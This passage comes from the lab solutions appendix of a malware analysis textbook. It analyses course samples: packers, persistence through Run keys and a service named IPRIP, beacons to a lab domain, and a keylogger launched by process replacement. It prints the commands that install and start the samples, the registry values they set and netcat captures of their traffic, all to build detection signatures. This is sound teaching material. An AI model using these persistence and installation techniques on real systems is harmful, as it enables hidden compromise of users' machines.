    and the import from *advapi32.dll* (CreateService) tell us that the code creates
    a service. When we look at the strings, we see www.malwareanalysisbook.com, which
    is probably the URL opened by InternetOpenURL as well as by Malservice, which
    could be the name of the service that is created.
  prefs: []
  type: TYPE_NORMAL
- en: We can’t be sure what this program is doing, but we’ve found some indicators
    to help search for this malware across a network.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 1-3 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: As of this writing, 25 of 43 virus engines identify this sample as malware.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The file is packed, but we can’t unpack it at this time.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: This question can’t be answered without unpacking the file.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: This question can’t be answered without unpacking the file.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: For the file *Lab01-03.exe*, *VirusTotal.com* reports a variety of different
    signatures with vague-sounding names. The most common signature is that of a file
    packed with the FSG packer.
  prefs: []
  type: TYPE_NORMAL
- en: When we open the file in PEview, we see several indications that the file is
    packed. The first is that the file sections have no names. Next, we see that the
    first section has a virtual size of 0x3000, but a raw data size of 0\. We run
    PEiD to confirm, and it identifies the packer as FSG 1.0 -> dulek/xt.
  prefs: []
  type: TYPE_NORMAL
- en: To confirm that the file is packed, we search for the imports, but there doesn’t
    seem to be an import table. An executable file without an import table is extremely
    rare, and its absence tells us that we should try another tool, because PEview
    is having trouble processing this file.
  prefs: []
  type: TYPE_NORMAL
- en: 'We open the file with Dependency Walker, and see that it does have an import
    table, but it imports only two functions: LoadLibrary and GetProcAddress.'
  prefs: []
  type: TYPE_NORMAL
- en: Packed files often import only these two functions, which further indicate that
    this file is packed. We can try to unpack the file using UPX, but we know that
    the file is packed with FSG, rather than UPX. We’ll return to this file in Chapter
    18, once we have covered the skills to unpack it.
  prefs: []
  type: TYPE_NORMAL
- en: '**480**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 1-4 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '**1**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: As of this writing, 16 of 43 antivirus engines identify this as malicious code
    that downloads and/or drops additional malware onto a system.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: There are no indications that the file is packed or obfuscated.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: According to the file header, this program was compiled in August 2019\.
  prefs: []
  type: TYPE_NORMAL
- en: Clearly, the compile time is faked, and we can’t determine when the file was
    compiled.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: The imports from *advapi32.dll* indicate that the program is doing something
    with permissions. The imports from WinExec and WriteFile, along with the results
    from *VirusTotal.com*, tell us that the program writes a file to disk and then
    executes it. There are also imports for reading information from the resource
    section of the file.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: The string \system32\wupdmgr.exe indicates that this program could create or
    modify a file at that location. The string www.malwareanalysisbook.com/
  prefs: []
  type: TYPE_NORMAL
- en: updater.exe probably indicates where additional malware is stored, ready for
    download.
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: The resource section contains another PE executable. Use Resource Hacker to
    save the resource as binary data, and then analyze the binary file as you would
    analyze any executable. The executable in the resource section is a downloader
    program that downloads additional malware.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: For the *Lab01-04.exe* file, the results from *VirusTotal.com* suggest a program
    related to a downloader. PEview gives no indication that the file is packed or
    obfuscated.
  prefs: []
  type: TYPE_NORMAL
- en: The imports from *advapi32.dll* tell us that program does something with permissions,
    and we can assume that it tries to access protected files using special permissions.
    The imports from *kernel32.dll* tell us that the program loads data from the resource
    section (LoadResource, FindResource, and SizeOfResource), writes a file to disk
    (CreateFile and WriteFile), and executes a file on the disk (WinExec). We can
    also guess that the program writes files to the system directory because of the
    calls to GetWindowsDirectory.
  prefs: []
  type: TYPE_NORMAL
- en: Examining the strings, we see www.malwareanalysisbok.com/updater.exe, which
    is probably the location that holds the malicious code for download.
  prefs: []
  type: TYPE_NORMAL
- en: We also see the string \system32\wupdmgr.exe, which, in combination with the
    call to GetWindowsDirectory, suggests that a file in *C:\Windows\ System32\* *wupdmgr.exe*
    is created or edited by this malware.
  prefs: []
  type: TYPE_NORMAL
- en: We now know with some confidence that this malicious file downloads new malware.
    We know where it downloads the malware from, and we can guess where it stores
    the downloaded malware. The only thing that’s odd is that the program doesn’t
    appear to access any network functions.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**481**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 94](index-515_1.png)'
  prefs: []
  type: TYPE_IMG
- en: The most interesting part of this malware is the resource section. When we open
    this malware in Resource Hacker, we see one resource. Resource Hacker identifies
    the type of the resource as binary, meaning arbitrary binary data, and when we
    look at the data, most of it is meaningless. But notice the string !This program
    cannot be run in DOS mode. This string is the error message included in the DOS
    header at the beginning of all PE files. We can therefore conclude that this resource
    is an additional executable file stored in the resource section of *Lab01-04.exe*.
    This is a fairly common technique used in malware.
  prefs: []
  type: TYPE_NORMAL
- en: To continue analyzing this file with Resource Hacker, we click **Action**
  prefs: []
  type: TYPE_NORMAL
- en: '**Save resource as binary file**. After saving the resource, we open the file
    in PEview to analyze the file embedded within it. Looking at the imports, we see
    that the embedded file is the one that accesses the network functions. It calls
    URLDownloadToFile, a function commonly used by malicious downloaders. It also
    calls WinExec, which probably executes the downloaded file.'
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 3-1 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware appears to be packed. The only import is ExitProcess, although the
    strings appear to be mostly clear and not obfuscated.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware creates a mutex named WinVMX32, copies itself into *C:\* *Windows\
    System32\vmx32to64.exe*. and installs itself to run on system startup by creating
    the registry key HKLM\SOFTWARE\Microsoft\Windows\ CurrentVersion\Run\VideoDriver
    set to the copy location.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware beacons a consistently sized 256-byte packet containing seemingly
    random data after resolving *www.practicalmalwareanalysis.com*.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: We begin with basic static analysis techniques, by looking at the malware’s
    PE
  prefs: []
  type: TYPE_NORMAL
- en: file structure and strings. Figure 3-1L shows that only *kernel32.dll* is imported.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 3-1L: PEview of* Lab03-01.exe *showing only one import* **482**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 95](index-516_1.png)'
  prefs: []
  type: TYPE_IMG
- en: There is only one import to this binary, ExitProcess, as seen at  in the import
    address table. Without any imports, it is tough to guess the program’s functionality.
    This program may be packed, since the imports will likely be resolved at runtime.
  prefs: []
  type: TYPE_NORMAL
- en: '**3**'
  prefs: []
  type: TYPE_NORMAL
- en: Next, we look at the strings, as shown in the following listing.
  prefs: []
  type: TYPE_NORMAL
- en: StubPath
  prefs: []
  type: TYPE_NORMAL
- en: SOFTWARE\Classes\http\shell\open\commandV
  prefs: []
  type: TYPE_NORMAL
- en: Software\Microsoft\Active Setup\Installed Components\
  prefs: []
  type: TYPE_NORMAL
- en: test
  prefs: []
  type: TYPE_NORMAL
- en: www.practicalmalwareanalysis.com
  prefs: []
  type: TYPE_NORMAL
- en: admin
  prefs: []
  type: TYPE_NORMAL
- en: VideoDriver
  prefs: []
  type: TYPE_NORMAL
- en: WinVMX32-
  prefs: []
  type: TYPE_NORMAL
- en: vmx32to64.exe
  prefs: []
  type: TYPE_NORMAL
- en: SOFTWARE\Microsoft\Windows\CurrentVersion\Run
  prefs: []
  type: TYPE_NORMAL
- en: SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders AppData
  prefs: []
  type: TYPE_NORMAL
- en: We wouldn’t expect to see strings, since the imports led us to believe that
    the file is packed, but there are many interesting strings, such as registry locations
    and a domain name, as well as WinVMX32, VideoDriver, and vmx32to64.exe.
  prefs: []
  type: TYPE_NORMAL
- en: Let’s see if basic dynamic analysis techniques will show us how these strings
    are used.
  prefs: []
  type: TYPE_NORMAL
- en: Before we run the malware, we run procmon and clear out all events; start Process
    Explorer; and set up a virtual network, including ApateDNS, Netcat (listening
    on ports 80 and 443), and network capturing with Wireshark.
  prefs: []
  type: TYPE_NORMAL
- en: Once we run the malware, we start examining the process in Process Explorer,
    as shown in Figure 3-2L. We begin by clicking *Lab03-01.exe* in the process listing
    and select **View****Lower Pane View****Handles**. In this view, we can see
    that the malware has created the mutex named WinVMX32 at . We also select **View****Lower
    Pane View****DLLs** and see that the malware has dynamically loaded DLLs such
    as *ws2_32.dll* and *wshtcpip.dll*, which means that it has networking functionality.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 3-2L: Process Explorer view of* Lab03-01.exe'
  prefs: []
  type: TYPE_NORMAL
- en: '*showing the mutex it creates*'
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**483**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 96](index-517_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '![Image 97](index-517_2.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Next, we use procmon to look for additional information. We bring up the Filter
    dialog by selecting **Filter****Filter**, and then set three filters: one on
    the Process Name (to show what *Lab03-01.exe* does to the system), and two more
    on Operation, as shown in Figure 3-3L. We include RegSetValue and WriteFile to
    show changes the malware makes to the filesystem and registry.'
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 3-3L: Process Monitor Filter dialog showing filters set on* *Process
    Name and Operation*'
  prefs: []
  type: TYPE_NORMAL
- en: Having set our filters, we click **Apply** to see the filtered result. The entries
    are reduced from thousands to just the 10 seen in Figure 3-4L. Notice that there
    is only one entry for WriteFile, and there are nine entries for RegSetValue.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 3-4L: Procmon filtered results (with three filters set)* As discussed
    in Chapter 3, we often need to filter out a certain amount of noise, such as entries
    0 and 3 through 9 in Figure 3-4L. The RegSetValue on HKLM\SOFTWARE\Microsoft\Cryptography\RNG\Seed
    is typical noise in the results because the random number generator seed is constantly
    updated in the registry by software.'
  prefs: []
  type: TYPE_NORMAL
- en: We are left with two interesting entries, as shown in Figure 3-4L at 
  prefs: []
  type: TYPE_NORMAL
- en: and . The first is the WriteFile operation at . Double-clicking this entry
    tells us that it wrote 7,168 bytes to *C:\WINDOWS\ system32\vmx32to64.exe*, which
    happens to be the same size as that of the file *Lab03-01.exe*. Opening Windows
    Explorer and browsing to that location shows that this newly created file has
    the same MD5 hash as *Lab03-01.exe*, which tells us that the malware has copied
    itself to that name and location. This can be a useful host-based indicator for
    the malware because it uses a hard-coded filename.
  prefs: []
  type: TYPE_NORMAL
- en: '**484**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'Next, we double-click the entry at  in the figure, and see that the malware
    wrote the following data to the registry:'
  prefs: []
  type: TYPE_NORMAL
- en: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VideoDriver:C:\WINDOWS\system32\vmx32to64.exe
    **3**
  prefs: []
  type: TYPE_NORMAL
- en: This newly created registry entry is used to run *vmx32to64.exe* on system startup
    using the HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run location and creating
    a key named VideoDriver. We can now bring up procmon’s Filter dialog, remove the
    Operation filters, and slowly comb through the entries for any information we
    may have missed.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we turn our attention to the network analysis tools we set up for basic
    dynamic analysis. First we check ApateDNS to see if the malware performed any
    DNS requests. Examining the output, we see a request for *www.practicalmalwareanalysis.com*,
    which matches the strings listing shown earlier. (To be sure that the malware
    has a chance to make additional DNS
  prefs: []
  type: TYPE_NORMAL
- en: requests, if any, perform the analysis process a couple of times to see if the
    DNS request changes or use the NXDOMAIN functionality of ApateDNS.) We complete
    the network analysis by examining the Netcat results, as shown in the following
    listing.
  prefs: []
  type: TYPE_NORMAL
- en: C:\> **nc -l -p 443**
  prefs: []
  type: TYPE_NORMAL
- en: \7⌠ëÅ¿A :°I,j!Yûöí?Ç:lƒh↨O±ⁿ)α←εg%┬∟#xp╧O+╙3Ω☺åiE☼?═■p}»╝/
  prefs: []
  type: TYPE_NORMAL
- en: º_∞~]ò£»ú¿¼▬F^"Äμ▒├
  prefs: []
  type: TYPE_NORMAL
- en: ♦∟ªòj╡<û(y!∟♫5Z☺!♀va╪┴╗úI┤ßX╤â8╫²ñö'i¢k╢╓(√Q‼%O¶╡9.▐σÅw♀‼±Wm^┐#ñæ╬°☻/
  prefs: []
  type: TYPE_NORMAL
- en: '[⌠│⌡xH╫▲É║‼'
  prefs: []
  type: TYPE_NORMAL
- en: x?╦Æº│ºLƒ↕x┌gYΦ<└§☻μºx)╤SBxè↕◄╟♂4AÇ
  prefs: []
  type: TYPE_NORMAL
- en: 'It looks like we got lucky: The malware appears to beacon out over port 443,
    and we were listening with Netcat over ports 80 and 443\. (Use INetSim to listen
    on all ports at once.) We run this test several times, and the data appears to
    be random each time.'
  prefs: []
  type: TYPE_NORMAL
- en: A follow-up in Wireshark tells us that the beacon packets are of consistent
    size (256 bytes) and appear to contain random data not related to the SSL protocol
    that normally operates over port 443\.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 3-2 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: To install the malware as a service, run the malware’s exported installA function
    via *rundll32.exe* with **rundll32.exe Lab03-02.dll,installA**.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: To run the malware, start the service it installs using the net command **net
    start IPRIP**.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: Use Process Explorer to determine which process is running the service.
  prefs: []
  type: TYPE_NORMAL
- en: Since the malware will be running within one of the *svchost.exe* files on the
    system, hover over each one until you see the service name, or search for *Lab03-02.dll*
    using the Find DLL feature of Process Explorer.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**485**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 98](index-519_1.png)'
  prefs: []
  type: TYPE_IMG
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: In procmon you can filter on the PID you found using Process Explorer.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: 'By default, the malware installs as the service IPRIP with a display name of
    Intranet Network Awareness (INA+) and description of “Depends INA+, Collects and
    stores network configuration and location information, and notifies applications
    when this information changes.” It installs itself for persistence in the registry
    at HKLM\SYSTEM\CurrentControlSet\Services\IPRIP\ Parameters\ServiceDll: %CurrentDirectory%\Lab03-02.dll.
    If you rename *Lab03-02.dll* to something else, such as *malware.dll*, then it
    writes *malware.dll* into the registry key, instead of using the name *Lab03-02.dll*.'
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware resolves the domain name *practicalmalwareanalysis.com* and connects
    to that host over port 80 using what appears to be HTTP. It does a GET request
    for *serve.html* and uses the User-Agent %ComputerName%
  prefs: []
  type: TYPE_NORMAL
- en: Windows XP 6.11\.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: We begin with basic static analysis by looking at the PE file structure and
    strings. Figure 3-5L shows that this DLL has five exports, as listed from  and
    below. The export ServiceMain suggests that this malware needs to be installed
    as a service in order to run properly.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 3-5L: PEview of* Lab03-02.dll *exports* The following listing shows
    the malware’s interesting imported functions in bold.'
  prefs: []
  type: TYPE_NORMAL
- en: OpenService
  prefs: []
  type: TYPE_NORMAL
- en: DeleteService
  prefs: []
  type: TYPE_NORMAL
- en: OpenSCManager
  prefs: []
  type: TYPE_NORMAL
- en: '**CreateService**'
  prefs: []
  type: TYPE_NORMAL
- en: RegOpenKeyEx
  prefs: []
  type: TYPE_NORMAL
- en: '**486**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: RegQueryValueEx
  prefs: []
  type: TYPE_NORMAL
- en: RegCreateKey
  prefs: []
  type: TYPE_NORMAL
- en: '**RegSetValueEx**'
  prefs: []
  type: TYPE_NORMAL
- en: InternetOpen
  prefs: []
  type: TYPE_NORMAL
- en: InternetConnect
  prefs: []
  type: TYPE_NORMAL
- en: '**3**'
  prefs: []
  type: TYPE_NORMAL
- en: HttpOpenRequest
  prefs: []
  type: TYPE_NORMAL
- en: '**HttpSendRequest**'
  prefs: []
  type: TYPE_NORMAL
- en: InternetReadFile
  prefs: []
  type: TYPE_NORMAL
- en: These include service-manipulation functions, such as CreateService, and registry-manipulation
    functions, such as RegSetValueEx. Imported networking functions, such as HttpSendRequest,
    suggest that the malware uses HTTP.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we examine the strings, as shown in the following listing.
  prefs: []
  type: TYPE_NORMAL
- en: Y29ubmVjdA==
  prefs: []
  type: TYPE_NORMAL
- en: practicalmalwareanalysis.com
  prefs: []
  type: TYPE_NORMAL
- en: serve.html
  prefs: []
  type: TYPE_NORMAL
- en: dW5zdXBwb3J0
  prefs: []
  type: TYPE_NORMAL
- en: c2xlZXA=
  prefs: []
  type: TYPE_NORMAL
- en: Y21k
  prefs: []
  type: TYPE_NORMAL
- en: cXVpdA==
  prefs: []
  type: TYPE_NORMAL
- en: Windows XP 6.11
  prefs: []
  type: TYPE_NORMAL
- en: HTTP/1.1
  prefs: []
  type: TYPE_NORMAL
- en: quit
  prefs: []
  type: TYPE_NORMAL
- en: exit
  prefs: []
  type: TYPE_NORMAL
- en: getfile
  prefs: []
  type: TYPE_NORMAL
- en: cmd.exe /c
  prefs: []
  type: TYPE_NORMAL
- en: Depends INA+, Collects and stores network configuration and location information,
    and notifies applications when this information changes.
  prefs: []
  type: TYPE_NORMAL
- en: '%SystemRoot%\System32\svchost.exe -k'
  prefs: []
  type: TYPE_NORMAL
- en: SYSTEM\CurrentControlSet\Services\
  prefs: []
  type: TYPE_NORMAL
- en: Intranet Network Awareness (INA+)
  prefs: []
  type: TYPE_NORMAL
- en: '%SystemRoot%\System32\svchost.exe -k netsvcs'
  prefs: []
  type: TYPE_NORMAL
- en: netsvcs
  prefs: []
  type: TYPE_NORMAL
- en: SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost
  prefs: []
  type: TYPE_NORMAL
- en: IPRIP
  prefs: []
  type: TYPE_NORMAL
- en: We see several interesting strings, including registry locations, a domain name,
    unique strings like IPRIP and serve.html, and a variety of encoded strings.
  prefs: []
  type: TYPE_NORMAL
- en: Basic dynamic techniques may show us how these strings and imports are used.
  prefs: []
  type: TYPE_NORMAL
- en: The results of our basic static analysis techniques lead us to believe that
    this malware needs to be installed as a service using the exported function installA.
    We’ll use that function to attempt to install this malware, but before we do that,
    we’ll launch Regshot to take a baseline snapshot of the registry and use Process
    Explorer to monitor the processes running on the system.
  prefs: []
  type: TYPE_NORMAL
- en: 'After setting up Regshot and Process Explorer, we install the malware using
    *rundll32.exe*, as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: C:\> **rundll32.exe Lab03-02.dll,installA**
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**487**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: After installing the malware, we use Process Explorer to confirm that it has
    terminated by making sure that *rundll32.exe* is no longer in the process listing.
    Next, we take a second snapshot with Regshot to see if the malware installed itself
    in the registry.
  prefs: []
  type: TYPE_NORMAL
- en: The edited Regshot results are shown in the following listing.
  prefs: []
  type: TYPE_NORMAL
- en: '----------------------------------'
  prefs: []
  type: TYPE_NORMAL
- en: Keys added
  prefs: []
  type: TYPE_NORMAL
- en: '----------------------------------'
  prefs: []
  type: TYPE_NORMAL
- en: HKLM\SYSTEM\CurrentControlSet\Services\IPRIP 
  prefs: []
  type: TYPE_NORMAL
- en: '----------------------------------'
  prefs: []
  type: TYPE_NORMAL
- en: Values added
  prefs: []
  type: TYPE_NORMAL
- en: '----------------------------------'
  prefs: []
  type: TYPE_NORMAL
- en: 'HKLM\SYSTEM\CurrentControlSet\Services\IPRIP\Parameters\ServiceDll:'
  prefs: []
  type: TYPE_NORMAL
- en: '"z:\Lab03-02.dll"'
  prefs: []
  type: TYPE_NORMAL
- en: 'HKLM\SYSTEM\CurrentControlSet\Services\IPRIP\ImagePath:'
  prefs: []
  type: TYPE_NORMAL
- en: '"%SystemRoot%\System32\svchost.exe -k netsvcs" '
  prefs: []
  type: TYPE_NORMAL
- en: 'HKLM\SYSTEM\CurrentControlSet\Services\IPRIP\DisplayName:'
  prefs: []
  type: TYPE_NORMAL
- en: '"Intranet Network Awareness (INA+)" '
  prefs: []
  type: TYPE_NORMAL
- en: 'HKLM\SYSTEM\CurrentControlSet\Services\IPRIP\Description:'
  prefs: []
  type: TYPE_NORMAL
- en: '"Depends INA+, Collects and stores network configuration and location information,
    and notifies applications when this information changes." '
  prefs: []
  type: TYPE_NORMAL
- en: The Keys added section shows that the malware installed itself as the service
    IPRIP at . Since the malware is a DLL, it depends on an executable to launch
    it. In fact, we see at  that the ImagePath is set to svchost.exe, which means
    that the malware will be launched inside an *svchost.exe* process. The rest of
    the information, such as the DisplayName and Description at  and , creates a
    unique fingerprint that can be used to identify the malicious service.
  prefs: []
  type: TYPE_NORMAL
- en: If we examine the strings closely, we see SOFTWARE\Microsoft\Windows NT\ CurrentVersion\SvcHost
    and a message "You specify service name not in Svchost//
  prefs: []
  type: TYPE_NORMAL
- en: netsvcs, must be one of following". If we follow our hunch and examine the
  prefs: []
  type: TYPE_NORMAL
- en: \SvcHost\netsvcs registry key, we can see other potential service names we might
    use, like 6to4 AppMgmt. Running Lab03-02.dll,installA 6to4 will install this malware
    under the 6to4 service instead of the IPRIP service, as in the previous listing.
  prefs: []
  type: TYPE_NORMAL
- en: After installing the malware as a service, we could launch it, but first we’ll
    set up the rest of our basic dynamic tools. We run procmon (after clearing out
    all events); start Process Explorer; and set up a virtual network, including ApateDNS
    and Netcat listening on port 80 (since we see HTTP in the strings listing).
  prefs: []
  type: TYPE_NORMAL
- en: 'Since this malware is installed as the IPRIP service, we can start it using
    the net command in Windows, as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: c:\> **net start IPRIP**
  prefs: []
  type: TYPE_NORMAL
- en: The Intranet Network Awareness (INA+) service is starting.
  prefs: []
  type: TYPE_NORMAL
- en: The Intranet Network Awareness (INA+) service was started successfully.
  prefs: []
  type: TYPE_NORMAL
- en: '**488**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 99](index-522_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '![Image 100](index-522_2.png)'
  prefs: []
  type: TYPE_IMG
- en: The fact that the display name (INA+) matches the information found in the registry
    tells us that our malicious service has started.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we open Process Explorer and attempt to find the process in which the
    malware is running by selecting **Find****Find Handle or DLL** to open the **3**
  prefs: []
  type: TYPE_NORMAL
- en: 'dialog shown in Figure 3-6L. We enter **Lab03-02.dll** and click **Search**.
    As shown in the figure, the result tells us that *Lab03-02.dll* is loaded by *svchost.exe*
    with the PID 1024\. (The specific PID may differ on your system.) *Figure 3-6L:
    Searching for a DLL in Process Explorer* In Process Explorer, we select **View****Lower
    Pane View****DLLs** and choose the *svchost.exe* running with PID 1024\. Figure
    3-7L shows the result.'
  prefs: []
  type: TYPE_NORMAL
- en: The display name Intranet Network Awareness (INA+) shown at  confirms that
    the malware is running in *svchost.exe*, which is further confirmed when we see
    at  that *Lab03-02.dll* is loaded.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 3-7L: Examining service malware in Process Explorer* Next, we turn
    our attention to our network analysis tools. First, we check ApateDNS to see if
    the malware performed any DNS requests. The output shows a request for *practicalmalwareanalysis.com*,
    which matches the strings listing shown earlier.'
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*It takes 60 seconds after starting the service to see any network traffic
    (the program does* *a Sleep(60000) before attempting network access). If the networking
    connection fails for* *any reason (for example, you forgot to set up ApateDNS),
    it waits 10 minutes before* *attempting to connect again.*'
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**489**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'We complete our network analysis by examining the Netcat results, as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: c:\> **nc -l -p 80**
  prefs: []
  type: TYPE_NORMAL
- en: '**GET** /serve.html HTTP/1.1'
  prefs: []
  type: TYPE_NORMAL
- en: 'Accept: */*'
  prefs: []
  type: TYPE_NORMAL
- en: 'User-Agent: **MalwareAnalysis2** Windows XP 6.11'
  prefs: []
  type: TYPE_NORMAL
- en: 'Host: practicalmalwareanalysis.com'
  prefs: []
  type: TYPE_NORMAL
- en: We see that the malware performs an HTTP GET request over port 80 (we were listening
    over port 80 with Netcat since we saw HTTP in the string listing). We run this
    test several times, and the data appears to be consistent across runs.
  prefs: []
  type: TYPE_NORMAL
- en: We can create a couple of network signatures from this data. Because the malware
    consistently does a GET request for *serve.html*, we can use that GET request
    as a network signature. The malware also uses the User-Agent MalwareAnalysis2
    Windows XP 6.11\. MalwareAnalysis2 is our malware analysis virtual machine’s name
    (so this portion of the User-Agent will be different on your machine). The second
    part of the User-Agent (Windows XP 6.11) is consistent and can be used as a network
    signature.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 3-3 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware performs process replacement on *svchost.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: Comparing the disk image of *svchost.exe* with its memory image shows that they
    are not the same. The memory image has strings such as practicalmalwareanalysis.log
    and [ENTER], but the disk image has neither.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware creates the log file *practicalmalwareanalysis.log*.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: The program performs process replacement on *svchost.exe* to launch a keylogger.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: For this lab, we begin by launching Process Explorer and procmon. When procmon
    starts, the events stream by quickly, so we use **File****Capture Events** to
    toggle event capture on and off. (It’s best to keep event capture off until all
    dynamic analysis programs are started and you’re ready to execute the program.)
    We use **Filter****Filter** to open the Filter dialog, and then ensure that only
    the default filters are enabled by clicking the **Reset** button.
  prefs: []
  type: TYPE_NORMAL
- en: '*Lab03-03.exe* can be run from the command prompt or by double-clicking its
    icon. Once run, *Lab03-03.exe* should be visible inside Process Explorer.'
  prefs: []
  type: TYPE_NORMAL
- en: Notice how it creates the subprocess *svchost.exe*, and then exits, but leaves
    the *svchost.exe* process running as an orphaned process, as shown in Figure 3-8L.
  prefs: []
  type: TYPE_NORMAL
